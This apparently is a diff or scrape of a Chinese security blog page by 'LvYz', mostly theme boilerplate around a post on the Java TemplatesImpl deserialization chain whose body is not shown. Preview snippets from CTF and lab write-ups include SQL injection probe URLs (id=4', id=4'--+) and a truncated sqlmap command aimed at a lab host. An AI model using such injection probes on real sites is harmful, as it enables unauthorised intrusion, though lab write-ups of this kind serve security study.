src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/03/29/Polar-JAVA%E9%A2%98WP/" title="Polar_JAVA题WP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Polar_JAVA题WP</div></div><div class="info-2"><div class="info-item-1">[Polar]EzJava题目来源：Polar 题目类型：WEB 设计考点：Spel任意命令执行  认识SpELSpring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。 Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEl可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。  基本用法:SpEL调用流程 : 1.新建解析器 2.解析表达式 3.注册变量(可省,在取值之前注册) 4.取值 示例1:不注册新变量的用法ExpressionParser parser = new SpelExpressionParser();//创建解析器Expression exp = parser.parseExpression(&quot;&#x27;Hello...</div></div></div></a><a class="pagination-related" href="/2025/03/30/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" title="春秋云镜Day1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">春秋云镜Day1</div></div><div class="info-2"><div class="info-item-1">春秋云镜靶机集合CVE-2022-28512靶标介绍：Fantastic Blog (CMS)是一个绝对出色的博客&#x2F;文章网络内容管理系统。它使您可以轻松地管理您的网站或博客，它为您提供了广泛的功能来定制您的博客以满足您的需求。它具有强大的功能，您无需接触任何代码即可启动并运行您的博客。 该CMS的&#x2F;single.php路径下，id参数存在一个SQL注入漏洞。   该网站是一个博客网站，通过URL可以发现一个id传参,尝试是否存在sql注入   http://eci-2ze0l1ibdu5c9ncsh2ku.cloudeci1.ichunqiu.com/single.php?id=4&#x27;  加入引号时出现报错  http://eci-2ze0l1ibdu5c9ncsh2ku.cloudeci1.ichunqiu.com/single.php?id=4&#x27;--+  加上注释符恢复正常，可以判断存在sql注入，sqlmap梭哈 python sqlmap.py -u...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">LvYz</div><div class="author-info-description">WebDog你知道的啊</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/LvYzCc" target="_blank" title=""><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">2.</span> <span class="toc-text">类加载器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#defineClass%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">3.</span> <span class="toc-text">defineClass加载器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E9%93%BE%E8%BF%87%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text">触发链过程</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CDay2/" title="春秋云镜Day2">春秋云镜Day2</a><time datetime="2025-04-20T03:16:07.000Z" title="发表于 2025-04-20 11:16:07">2025-04-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/19/EventListenerList%E8%A7%A6%E5%8F%91%E4%BB%BB%E6%84%8FtoString/" title="EventListenerList触发任意toString">EventListenerList触发任意toString</a><time datetime="2025-04-19T05:54:49.000Z" title="发表于 2025-04-19 13:54:49">2025-04-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/18/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="java二次反序列化">java二次反序列化</a><time datetime="2025-04-18T08:27:41.000Z" title="发表于 2025-04-18 16:27:41">2025-04-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/18/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="fastjson原生反序列化">fastjson原生反序列化</a><time datetime="2025-04-18T07:49:15.000Z" title="发表于 2025-04-18 15:49:15">2025-04-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/13/TGCTF2025/" title="TGCTF2025">TGCTF2025</a><time datetime="2025-04-13T03:01:21.000Z" title="发表于 2025-04-13 11:01:21">2025-04-13</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By LvYz</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.2.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/" class="category-chain-item">知识点</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>TemplatesImpl类中的调用链</div>
+      <div>https://lvyzcc.github.io/2025/03/29/TemplatesImpl类中的调用链/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>LvYz</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月29日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/03/30/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" title="春秋云镜Day1">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">春秋云镜Day1</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/29/Polar-JAVA%E9%A2%98WP/" title="Polar_JAVA题WP">
+                        <span class="hidden-mobile">Polar_JAVA题WP</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
